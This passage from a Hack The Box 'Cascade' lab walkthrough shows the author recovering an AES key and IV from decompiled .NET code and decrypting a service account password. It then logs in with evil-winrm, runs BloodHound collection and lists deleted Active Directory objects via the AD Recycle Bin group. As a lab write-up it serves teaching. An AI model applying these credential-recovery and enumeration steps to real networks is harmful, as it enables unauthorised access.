</span><span id="__span-55-45"><a id="__codelineno-55-45" name="__codelineno-55-45" href="#__codelineno-55-45"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">Mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
</span><span id="__span-55-46"><a id="__codelineno-55-46" name="__codelineno-55-46" href="#__codelineno-55-46"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">Key</span><span class="p">);</span>
</span><span id="__span-55-47"><a id="__codelineno-55-47" name="__codelineno-55-47" href="#__codelineno-55-47"></a><span class="w">    </span><span class="k">using</span><span class="w"> </span><span class="p">(</span><span class="n">MemoryStream</span><span class="w"> </span><span class="n">memoryStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
</span><span id="__span-55-48"><a id="__codelineno-55-48" name="__codelineno-55-48" href="#__codelineno-55-48"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-55-49"><a id="__codelineno-55-49" name="__codelineno-55-49" href="#__codelineno-55-49"></a><span class="w">      </span><span class="k">using</span><span class="w"> </span><span class="p">(</span><span class="n">CryptoStream</span><span class="w"> </span><span class="n">cryptoStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CryptoStream</span><span class="p">((</span><span class="n">Stream</span><span class="p">)</span><span class="w"> </span><span class="n">memoryStream</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(),</span><span class="w"> </span><span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">))</span>
</span><span id="__span-55-50"><a id="__codelineno-55-50" name="__codelineno-55-50" href="#__codelineno-55-50"></a><span class="w">      </span><span class="p">{</span>
</span><span id="__span-55-51"><a id="__codelineno-55-51" name="__codelineno-55-51" href="#__codelineno-55-51"></a><span class="w">        </span><span class="kt">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">numArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="p">[</span><span class="k">checked</span><span class="w"> </span><span class="p">(</span><span class="n">buffer</span><span class="p">.</span><span class="n">Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)];</span>
</span><span id="__span-55-52"><a id="__codelineno-55-52" name="__codelineno-55-52" href="#__codelineno-55-52"></a><span class="w">        </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">numArray</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">numArray</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
</span><span id="__span-55-53"><a id="__codelineno-55-53" name="__codelineno-55-53" href="#__codelineno-55-53"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">numArray</span><span class="p">);</span>
</span><span id="__span-55-54"><a id="__codelineno-55-54" name="__codelineno-55-54" href="#__codelineno-55-54"></a><span class="w">      </span><span class="p">}</span>
</span><span id="__span-55-55"><a id="__codelineno-55-55" name="__codelineno-55-55" href="#__codelineno-55-55"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-55-56"><a id="__codelineno-55-56" name="__codelineno-55-56" href="#__codelineno-55-56"></a><span class="w">  </span><span class="p">}</span>
</span><span id="__span-55-57"><a id="__codelineno-55-57" name="__codelineno-55-57" href="#__codelineno-55-57"></a><span class="p">}</span>
</span></code></pre></div><br />
What i noticed here, was that both encryption and decryption used this <code>IV</code>: <code>1tdyjCbY1Ix49842</code><br />
I also observed from the source code above that it uses <code>aes</code> encryption. <br />
The last thing we need to find, is the key that is passed as parameter on those functions, for this part, we need to examine the <code>CascAudit.exe</code>.</p>
<p>By opening it again via DotPeek, my goal was to find the <code>main function</code>, and later i found the part where <code>public static void Main()</code> is:<br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250702175513.png" /><br />
It seems that <code>DecryptString</code> is called there, and the parameter (key) is <code>c4scadek3y654321</code></p>
<p>So the whole encryption specs are:<br />
- <code>AES</code><br />
- <code>CBC</code> mode<br />
- block &amp; key size = <code>128</code><br />
- IV= <code>1tdyjCbY1Ix49842</code><br />
- key= <code>c4scadek3y654321</code><br />
- <code>UTF-8</code> encoding</p>
<h4 id="reverse-the-encryption-process">Reverse the encryption process</h4>
<p>So knowing all these, lets get in cyberchef in order to reverse the encryption process (decrypt), by providing what we already know:<br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250702175902.png" /><br />
so the decrypted pass now is:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>w3lc0meFr31nd
</span></code></pre></div></p>
<p>great, we decrypted this encrypted text, remember this was inserted as value along with the user <code>ArkSvc</code> in the <code>Audit.db</code> file. <br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>Ldap<span class="w"> </span>VALUES<span class="o">(</span><span class="m">1</span>,<span class="s1">&#39;ArkSvc&#39;</span>,<span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span>,<span class="s1">&#39;cascade.local&#39;</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></div><br />
So its safe to assume that it corresponds to <code>ArkSvc</code>, lets try logging in via win-rm, the creds are:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>ArkSvc
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>w3lc0meFr31nd
</span></code></pre></div></p>
<h4 id="logging-in-as-arksvc">Logging in as <code>ArkSvc</code></h4>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>cascade.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;ArkSvc&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;w3lc0meFr31nd&#39;</span>
</span></code></pre></div><br />
successfully logged in, but it seems that we are not done here, we cant access the admin directory.</p>
<h3 id="bloodhound-as-arksvc">Bloodhound as ArkSvc</h3>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;ArkSvc&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;w3lc0meFr31nd&#39;</span><span class="w">  </span>-d<span class="w"> </span>cascade.htb<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.10.10.182<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
</span></code></pre></div><br />
but again it does not work, but WHY?</p>
<p>By default, bloodhound uses UDP (normal DNS over UDP/53) by sending DNS SRV queries over UDP to whatever nameserver its using with the <code>-ns</code> parameter.</p>
<p>Well, first of all, my initial nmap scan was TCP only and did not take into consideration UDP at all, so lets fix that:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span><span class="w"> </span>--reason<span class="w"> </span>-v<span class="w"> </span><span class="m">10</span>.129.30.110
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-11-10<span class="w"> </span><span class="m">13</span>:43<span class="w"> </span>CST
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>Initiating<span class="w"> </span>Ping<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">13</span>:43
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>Scanning<span class="w"> </span><span class="m">10</span>.129.30.110<span class="w"> </span><span class="o">[</span><span class="m">4</span><span class="w"> </span>ports<span class="o">]</span>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>Completed<span class="w"> </span>Ping<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">13</span>:43,<span class="w"> </span><span class="m">0</span>.10s<span class="w"> </span>elapsed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>total<span class="w"> </span>hosts<span class="o">)</span>
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>Initiating<span class="w"> </span>UDP<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">13</span>:43
</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>Scanning<span class="w"> </span>cascade.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.30.110<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">1</span><span class="w"> </span>port<span class="o">]</span>
</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>Discovered<span class="w"> </span>open<span class="w"> </span>port<span class="w"> </span><span class="m">53</span>/udp<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.129.30.110
</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a>Completed<span class="w"> </span>UDP<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">13</span>:43,<span class="w"> </span><span class="m">0</span>.21s<span class="w"> </span>elapsed<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>total<span class="w"> </span>ports<span class="o">)</span>
</span><span id="__span-62-9"><a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>cascade.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.30.110<span class="o">)</span>
</span><span id="__span-62-10"><a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a>Host<span class="w"> </span>is<span class="w"> </span>up,<span class="w"> </span>received<span class="w"> </span>echo-reply<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.085s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-62-11"><a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a>
</span><span id="__span-62-12"><a id="__codelineno-62-12" name="__codelineno-62-12" href="#__codelineno-62-12"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>REASON
</span><span id="__span-62-13"><a id="__codelineno-62-13" name="__codelineno-62-13" href="#__codelineno-62-13"></a><span class="m">53</span>/udp<span class="w"> </span>open<span class="w">  </span>domain<span class="w">  </span>udp-response<span class="w"> </span>ttl<span class="w"> </span><span class="m">127</span>
</span><span id="__span-62-14"><a id="__codelineno-62-14" name="__codelineno-62-14" href="#__codelineno-62-14"></a>
</span><span id="__span-62-15"><a id="__codelineno-62-15" name="__codelineno-62-15" href="#__codelineno-62-15"></a>Read<span class="w"> </span>data<span class="w"> </span>files<span class="w"> </span>from:<span class="w"> </span>/usr/bin/../share/nmap
</span><span id="__span-62-16"><a id="__codelineno-62-16" name="__codelineno-62-16" href="#__codelineno-62-16"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.46<span class="w"> </span>seconds
</span><span id="__span-62-17"><a id="__codelineno-62-17" name="__codelineno-62-17" href="#__codelineno-62-17"></a><span class="w">           </span>Raw<span class="w"> </span>packets<span class="w"> </span>sent:<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="o">(</span>250B<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Rcvd:<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">(</span>132B<span class="o">)</span>
</span></code></pre></div><br />
Now its clear that:<br />
- UDP port 53 is actually open.<br />
- Nmap received a UDP response (udp-response ttl 127)  the server is replying to UDP packets.<br />
- This proves that UDP is not blocked at the network or firewall level</p>
<p>So we need to try sth else, and i found online that wee need to tell bloodhound to use TCP and dns timeout!</p>
<h4 id="why-bloodhound-needs-dns-tcp-and-dns-timeout">Why BloodHound needs <code>--dns-tcp</code> and <code>--dns-timeout</code></h4>
<p>Even though UDP is open:<br />
1. BloodHounds SRV lookup uses Python (dnspython).<br />
2. Some Windows AD DNS servers (especially 2008 R2 / lab setups) sometimes respond unreliably to SRV queries over UDP, or require TCP if the packet is larger than ~512 bytes (common for SRV discovery).<br />
3. Increasing the timeout (--dns-timeout 10) and forcing TCP (--dns-tcp) ensures BloodHound reliably receives the full SRV record.</p>
<p>In our case, </p>
<p>Here i prepared a small checklist for when default bloodhound usage is not sufficient:<br />
1. Start: -ns <DNS_IP>  default UDP<br />
2. If UDP fails: add --dns-tcp<br />
3. If still failing: increase timeout --dns-timeout 10<br />
4. If still failing: skip SRV, use -dc <DC_FQDN> + --disable-autogc<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;s.smith&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;sT333ve2&#39;</span><span class="w"> </span>-d<span class="w"> </span>cascade.local<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.30.110<span class="w"> </span>--dns-tcp<span class="w"> </span>--dns-timeout<span class="w"> </span><span class="m">10</span><span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
</span></code></pre></div><br />
and its clear that bloodhound now runs successfully:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>INFO:<span class="w"> </span>BloodHound.py<span class="w"> </span><span class="k">for</span><span class="w"> </span>BloodHound<span class="w"> </span>LEGACY<span class="w"> </span><span class="o">(</span>BloodHound<span class="w"> </span><span class="m">4</span>.2<span class="w"> </span>and<span class="w"> </span><span class="m">4</span>.3<span class="o">)</span>
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>INFO:<span class="w"> </span>Found<span class="w"> </span>AD<span class="w"> </span>domain:<span class="w"> </span>cascade.local
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>INFO:<span class="w"> </span>Getting<span class="w"> </span>TGT<span class="w"> </span><span class="k">for</span><span class="w"> </span>user
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>WARNING:<span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>Kerberos<span class="w"> </span>TGT.<span class="w"> </span>Falling<span class="w"> </span>back<span class="w"> </span>to<span class="w"> </span>NTLM<span class="w"> </span>authentication.<span class="w"> </span>Error:<span class="w"> </span><span class="o">[</span>Errno<span class="w"> </span>Connection<span class="w"> </span>error<span class="w"> </span><span class="o">(</span>casc-dc1.cascade.local:88<span class="o">)]</span><span class="w"> </span><span class="o">[</span>Errno<span class="w"> </span>-2<span class="o">]</span><span class="w"> </span>Name<span class="w"> </span>or<span class="w"> </span>service<span class="w"> </span>not<span class="w"> </span>known
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>casc-dc1.cascade.local
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains
</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>forest
</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>computers
</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>casc-dc1.cascade.local
</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">18</span><span class="w"> </span>users
</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">53</span><span class="w"> </span>groups
</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">7</span><span class="w"> </span>gpos
</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">6</span><span class="w"> </span>ous
</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">19</span><span class="w"> </span>containers
</span><span id="__span-64-15"><a id="__codelineno-64-15" name="__codelineno-64-15" href="#__codelineno-64-15"></a>INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">0</span><span class="w"> </span>trusts
</span><span id="__span-64-16"><a id="__codelineno-64-16" name="__codelineno-64-16" href="#__codelineno-64-16"></a>INFO:<span class="w"> </span>Starting<span class="w"> </span>computer<span class="w"> </span>enumeration<span class="w"> </span>with<span class="w"> </span><span class="m">10</span><span class="w"> </span>workers
</span><span id="__span-64-17"><a id="__codelineno-64-17" name="__codelineno-64-17" href="#__codelineno-64-17"></a>INFO:<span class="w"> </span>Querying<span class="w"> </span>computer:<span class="w"> </span>CASC-DC1.cascade.local
</span><span id="__span-64-18"><a id="__codelineno-64-18" name="__codelineno-64-18" href="#__codelineno-64-18"></a>INFO:<span class="w"> </span>Done<span class="w"> </span><span class="k">in</span><span class="w"> </span>00M<span class="w"> </span>22S
</span><span id="__span-64-19"><a id="__codelineno-64-19" name="__codelineno-64-19" href="#__codelineno-64-19"></a>INFO:<span class="w"> </span>Compressing<span class="w"> </span>output<span class="w"> </span>into<span class="w"> </span>20251110133123_bloodhound.zip
</span></code></pre></div></p>
<p>Assuming that bloodhound couldnt work, lets find the info we need from the inside.</p>
<h4 id="group-membership-of-arksvc">Group membership of ArkSvc</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>net<span class="w"> </span>user<span class="w"> </span>ArkSvc
</span></code></pre></div>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>User<span class="w"> </span>name<span class="w">                    </span>arksvc
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>Full<span class="w"> </span>Name<span class="w">                    </span>ArkSvc
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>Comment
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>User<span class="err">&#39;</span>s<span class="w"> </span>comment
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>Country<span class="w"> </span>code<span class="w">                 </span><span class="m">000</span><span class="w"> </span><span class="o">(</span>System<span class="w"> </span>Default<span class="o">)</span>
</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>Account<span class="w"> </span>active<span class="w">               </span>Yes
</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a>Account<span class="w"> </span>expires<span class="w">              </span>Never
</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>
</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>Password<span class="w"> </span>last<span class="w"> </span><span class="nb">set</span><span class="w">            </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">5</span>:18:20<span class="w"> </span>PM
</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a>Password<span class="w"> </span>expires<span class="w">             </span>Never
</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>Password<span class="w"> </span>changeable<span class="w">          </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">5</span>:18:20<span class="w"> </span>PM
</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a>Password<span class="w"> </span>required<span class="w">            </span>Yes
</span><span id="__span-66-13"><a id="__codelineno-66-13" name="__codelineno-66-13" href="#__codelineno-66-13"></a>User<span class="w"> </span>may<span class="w"> </span>change<span class="w"> </span>password<span class="w">     </span>No
</span><span id="__span-66-14"><a id="__codelineno-66-14" name="__codelineno-66-14" href="#__codelineno-66-14"></a>
</span><span id="__span-66-15"><a id="__codelineno-66-15" name="__codelineno-66-15" href="#__codelineno-66-15"></a>Workstations<span class="w"> </span>allowed<span class="w">         </span>All
</span><span id="__span-66-16"><a id="__codelineno-66-16" name="__codelineno-66-16" href="#__codelineno-66-16"></a>Logon<span class="w"> </span>script
</span><span id="__span-66-17"><a id="__codelineno-66-17" name="__codelineno-66-17" href="#__codelineno-66-17"></a>User<span class="w"> </span>profile
</span><span id="__span-66-18"><a id="__codelineno-66-18" name="__codelineno-66-18" href="#__codelineno-66-18"></a>Home<span class="w"> </span>directory
</span><span id="__span-66-19"><a id="__codelineno-66-19" name="__codelineno-66-19" href="#__codelineno-66-19"></a>Last<span class="w"> </span>logon<span class="w">                   </span><span class="m">1</span>/29/2020<span class="w"> </span><span class="m">10</span>:05:40<span class="w"> </span>PM
</span><span id="__span-66-20"><a id="__codelineno-66-20" name="__codelineno-66-20" href="#__codelineno-66-20"></a>
</span><span id="__span-66-21"><a id="__codelineno-66-21" name="__codelineno-66-21" href="#__codelineno-66-21"></a>Logon<span class="w"> </span>hours<span class="w"> </span>allowed<span class="w">          </span>All
</span><span id="__span-66-22"><a id="__codelineno-66-22" name="__codelineno-66-22" href="#__codelineno-66-22"></a>
</span><span id="__span-66-23"><a id="__codelineno-66-23" name="__codelineno-66-23" href="#__codelineno-66-23"></a>Local<span class="w"> </span>Group<span class="w"> </span>Memberships<span class="w">      </span>*AD<span class="w"> </span>Recycle<span class="w"> </span>Bin<span class="w">       </span>*IT
</span><span id="__span-66-24"><a id="__codelineno-66-24" name="__codelineno-66-24" href="#__codelineno-66-24"></a><span class="w">                             </span>*Remote<span class="w"> </span>Management<span class="w"> </span>Use
</span><span id="__span-66-25"><a id="__codelineno-66-25" name="__codelineno-66-25" href="#__codelineno-66-25"></a>Global<span class="w"> </span>Group<span class="w"> </span>memberships<span class="w">     </span>*Domain<span class="w"> </span>Users
</span><span id="__span-66-26"><a id="__codelineno-66-26" name="__codelineno-66-26" href="#__codelineno-66-26"></a>The<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</span></code></pre></div><br />
Very interesting, local group membership reveals that this user is member of <code>AD Recycle Bin</code> group, how can we take advantage of it though?</p>
<h4 id="retrieving-deleted-objects-from-recycle-bin">Retrieving deleted objects from Recycle Bin</h4>
<p>Using hacktricks: https://github.com/ivanversluis/pentest-hacktricks/blob/master/windows/active-directory-methodology/privileged-accounts-and-token-privileges.md<br />
i found this command below:<br />
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="c">#You need to be in the &quot;AD Recycle Bin&quot; group of the AD to list the deleted AD objects</span>
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="nb">Get-ADObject</span> <span class="n">-filter</span> <span class="s1">&#39;isDeleted -eq $true&#39;</span> <span class="n">-includeDeletedObjects</span> <span class="n">-Properties</span> <span class="p">*</span>
</span></code></pre></div><br />
we get all the deleted objects, lets inspect them.<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>CN<span class="w">                              </span>:<span class="w"> </span>Deleted<span class="w"> </span>Objects
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>Created<span class="w">                         </span>:<span class="w"> </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">3</span>:31:39<span class="w"> </span>PM
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>createTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/9/2020<span class="w"> </span><span class="m">3</span>:31:39<span class="w"> </span>PM
</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>Deleted<span class="w">                         </span>:<span class="w"> </span>True
</span><span id="__span-68-6"><a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a>Description<span class="w">                     </span>:<span class="w"> </span>Default<span class="w"> </span>container<span class="w"> </span><span class="k">for</span><span class="w"> </span>deleted<span class="w"> </span>objects
</span><span id="__span-68-7"><a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a>DisplayName<span class="w">                     </span>:
</span><span id="__span-68-8"><a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a>DistinguishedName<span class="w">               </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-9"><a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a>dSCorePropagationData<span class="w">           </span>:<span class="w"> </span><span class="o">{</span><span class="m">1</span>/1/1601<span class="w"> </span><span class="m">12</span>:00:00<span class="w"> </span>AM<span class="o">}</span>
</span><span id="__span-68-10"><a id="__codelineno-68-10" name="__codelineno-68-10" href="#__codelineno-68-10"></a>instanceType<span class="w">                    </span>:<span class="w"> </span><span class="m">4</span>
</span><span id="__span-68-11"><a id="__codelineno-68-11" name="__codelineno-68-11" href="#__codelineno-68-11"></a>isCriticalSystemObject<span class="w">          </span>:<span class="w"> </span>True
</span><span id="__span-68-12"><a id="__codelineno-68-12" name="__codelineno-68-12" href="#__codelineno-68-12"></a>isDeleted<span class="w">                       </span>:<span class="w"> </span>True
</span><span id="__span-68-13"><a id="__codelineno-68-13" name="__codelineno-68-13" href="#__codelineno-68-13"></a>LastKnownParent<span class="w">                 </span>:
</span><span id="__span-68-14"><a id="__codelineno-68-14" name="__codelineno-68-14" href="#__codelineno-68-14"></a>Modified<span class="w">                        </span>:<span class="w"> </span><span class="m">1</span>/13/2020<span class="w"> </span><span class="m">1</span>:21:17<span class="w"> </span>AM
